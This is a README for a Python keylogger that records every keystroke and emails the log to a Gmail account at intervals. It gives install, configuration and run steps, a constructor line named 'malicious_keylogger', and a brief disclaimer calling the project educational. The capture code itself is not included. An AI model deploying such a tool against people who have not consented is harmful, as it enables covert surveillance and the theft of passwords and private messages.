# Keylogger Project

This project is a Python-based keylogger that captures keystrokes and sends them via email at regular intervals.

## Components

1. **`keylogger.py`**: Contains the logic for capturing keystrokes and sending them via email.
2. **`execute_keylogger.py`**: Initializes and starts the keylogger with specified settings.

## Features

- Captures all keystrokes, including special keys.
- Sends captured keystrokes via email at a defined interval.
- Configurable time interval and email settings.

## Prerequisites

- Python 3.x
- `pynput` library
- Access to a Gmail account for sending emails

## Installation

1. **Clone the Repository**:
   ```bash
   git clone <repository_url>
   cd <repository_directory>

2. **Set Up Environment**:
   ```bash
   python -m venv venv
   venv\Scripts\activate  # On Windows
   source venv/bin/activate  # On macOS/Linux

3. **Install Dependencies**:
   ```bash
   pip install pynput


## Configuration

1. **Edit 'execute_keylogger.py'**:
   Set the desired email and password:
   ```bash
   malicious_keylogger = keylogger.KeyLogger(30, 'your_email@gmail.com', 'your_password')


## Usage

1. **Run the Keylogger**:
   ```bash
   python execute_keylogger.py

2. **Monitor Your Email**:
   The keylogger will send captured keystrokes to the specified email address at the defined interval.


## Ethical Considerations

- **Use Responsibly:** Ensure you have explicit permission to use this keylogger. Unauthorized use may be illegal and unethical.
- **Intended for Educational Purposes:** This project is intended for learning and understanding keylogging techniques.
